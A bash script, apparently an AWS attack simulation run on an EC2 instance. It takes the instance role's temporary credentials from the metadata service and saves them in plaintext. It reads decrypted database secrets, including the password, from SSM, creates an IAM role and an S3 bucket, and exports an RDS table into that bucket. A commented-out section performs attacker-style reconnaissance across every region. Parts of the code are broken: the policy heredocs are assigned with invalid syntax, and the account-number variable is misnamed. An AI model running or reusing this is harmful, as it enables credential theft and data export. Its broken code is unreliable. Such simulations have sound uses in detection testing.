#!/bin/bash

SCRIPTNAME=instance2rds
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
truncate -s 0 $LOGFILE
check_apt() {
  pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
  log "Waiting for apt to be available..."
  sleep 10
done

log "Checking for aws cli..."
while ! which aws > /dev/null; do
    log "aws cli not found or not ready - waiting"
    sleep 120
done
log "aws path: $(which aws)"

log "installing jq..."
apt-get install -y jq

INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)

# create an env file for scoutsuite
log "Building env file with ec2 instance creds..."
cat > .aws-ec2-instance <<-EOF
AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
AWS_DEFAULT_REGION=us-east-1
AWS_DEFAULT_OUTPUT=json
EOF

log "Setting up a instance profile with aws cli"
PROFILE="instance"
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE

log "Running: aws sts get-caller-identity --profile=instance"
aws sts get-caller-identity --profile=instance >> $LOGFILE 2>&1

aws ssm get-parameter --name="db_host" --with-decryption --profile=instance --region=${region}
aws ssm get-parameter --name="db_name" --with-decryption --profile=instance --region=${region}
aws ssm get-parameter --name="db_username" --with-decryption --profile=instance --region=${region}
aws ssm get-parameter --name="db_password" --with-decryption --profile=instance --region=${region}

AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=instance | jq -r '.Account')
DATE=$(date '+%Y-%m-%d')
EPOCH_TIME=$(date +%s)
aws s3api create-bucket --bucket db-backup-${environment}-${deployment}-$DATE --region=${region}
POLICY=cat <<EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "ExportPolicy",
            "Effect": "Allow",
            "Action": [
                "s3:PutObject*",
                "s3:ListBucket",
                "s3:GetObject*",
                "s3:DeleteObject*",
                "s3:GetBucketLocation"
            ],
            "Resource": [
                "arn:aws:s3:::db-backup-${environment}-${deployment}-$DATE",
                "arn:aws:s3:::db-backup-${environment}-${deployment}-$DATE/*"
            ]
        }
    ]
}
EOF
ROLE=cat<<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "export.rds.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ] 
}
EOF
POLICY_ARN=$(aws iam create-policy  --policy-name db-export-policy-${environment}-${deployment} --policy-document=$POLICY | jq -r '.Policy.Arn')
ROLE_ARN=$(aws iam create-role  --role-name rds-s3-export-role-${environment}-${deployment}  --assume-role-policy-document=$ROLE | jq -r '.Role.Arn')
aws iam attach-role-policy  --policy-arn=$POLICY_ARN  --role-name=rds-s3-export-role-${environment}-${deployment}

aws rds export-table-to-point-in-time \
  --source-arn arn:aws:rds:${region}:$ACCOUNT_NUMBER:table:cast \
  --s3-bucket db-backup-${environment}-${deployment}-$DATE \
  --s3-prefix backup \
  --export-time $EPOCH_TIME

# # prefer scoutsuite for discovery
# docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws

# log "Setting User-agent: AWS_EXECUTION_ENV=discovery"
# export AWS_EXECUTION_ENV="discovery"

# log "Starting..."
# log "Discovery access attacker simulation..."
# log "Current IP: $(curl -s http://icanhazip.com)"
# opts="--output json --color off --no-cli-pager"
# for REGION in $(aws ec2 describe-regions --output text | cut -f4); do
#     log "Discovery using AWS_REGION: $REGION"
#     log "Running: aws iam list-users $opts --region \"$REGION\""
#     aws iam list-users $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws s3api list-buckets $opts --region \"$REGION\""
#     aws s3api list-buckets $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-elastic-gpus $opts --region \"$REGION\""
#     aws ec2 describe-elastic-gpus $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-hosts $opts --region \"$REGION\""
#     aws ec2 describe-hosts $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts --region \"$REGION\""
#     aws ec2 describe-images --filters "Name=name,Values=ubuntu-pro-server/images/*20.04*" $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-network-acls $opts --region \"$REGION\""
#     aws ec2 describe-network-acls $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-reserved-instances $opts --region \"$REGION\""
#     aws ec2 describe-reserved-instances $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-security-groups $opts --region \"$REGION\""
#     aws ec2 describe-security-groups $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-snapshots $opts --region \"$REGION\""
#     aws ec2 describe-snapshots $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-volumes $opts --region \"$REGION\""
#     aws ec2 describe-volumes $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
#     log "Running: aws ec2 describe-vpcs $opts --region \"$REGION\""
#     aws ec2 describe-vpcs $opts --region "$REGION" --profile=$PROFILE >> $LOGFILE 2>&1
# done

log "Done."